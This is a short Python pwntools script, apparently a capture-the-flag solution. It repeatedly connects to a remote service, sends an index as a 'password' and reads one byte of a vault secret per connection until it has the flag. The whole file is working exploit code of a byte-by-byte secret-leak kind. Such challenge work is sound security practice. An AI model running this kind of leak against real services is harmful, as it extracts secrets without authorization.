#!/usr/bin/env python3

from pwn import *
context.log_level = "error"

def exploit(HOST, PORT):
    flag = ""
    for i in range(21):
        io = remote(HOST, PORT)
        io.recv()
        io.sendline(b"1")
        io.sendlineafter(b"password (0-31): ", str(i).encode())
        io.recv()
        io.sendline(b"2")
        io.recvuntil(b"for Vault: ")
        flag += chr(io.recv(i+1)[-1])
        io.close()
    
    print(flag)

def main():
    HOST, PORT = sys.argv[1].split(":")
    exploit(HOST, PORT)

if __name__ == "__main__":
    main()
